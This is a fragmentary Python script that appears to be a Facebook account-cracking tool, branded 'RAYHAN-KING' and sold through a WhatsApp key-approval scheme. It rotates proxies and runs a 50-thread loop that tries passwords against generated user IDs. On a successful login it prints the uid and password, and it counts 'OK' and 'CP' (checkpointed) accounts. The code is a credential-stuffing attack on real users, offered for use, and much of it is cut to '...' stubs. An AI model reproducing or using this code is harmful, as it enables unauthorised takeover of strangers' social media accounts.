...
#os.system("KINGg-open https://facebook.com/groups/651079003382136/")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[RAYHAN-KING')
prox=open('.prox.txt','r').read().splitlines()
for KING in range(10000):
...
\033[1;91m--------------------------------------------
\033[1;91m[] CREATOR   > RAIHAN PARVEZ
\033[1;91m[] FACEBOOK  > RAYHAN AHMED
\033[1;91m[] GITHUB    > R1YH1N-05
\033[1;91m[] VERSION   > FREE
\033[1;91m[] WHATSAPP  > +8801300558774
\033[1;91m-------------------------------------------"""  )
...
def menu():
	...
	if _____RAYHAN_____ in ['4']:
		os.system("KINGg-open https://www.facebook.com/Rayhan.Official.55")
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(RAYHAN_NAME))
...
def Y2():
    ...
    with ThreadPool(max_workers=50) as RAYHAN:
        ...
        for love in user:
            ...
            uid = code+love
            RAYHAN.submit(RAYHAN,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mRAYHAN-KING\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    ...
        	    continue
        loop+=1
        sys.stdout.write('\r%s[RAYHAN-KING]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20RAYHAN%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://raw.githubusercontent.com/MrRAYHAN156/approved.txt/main/approved.%20txt').text
    if key1 in r:
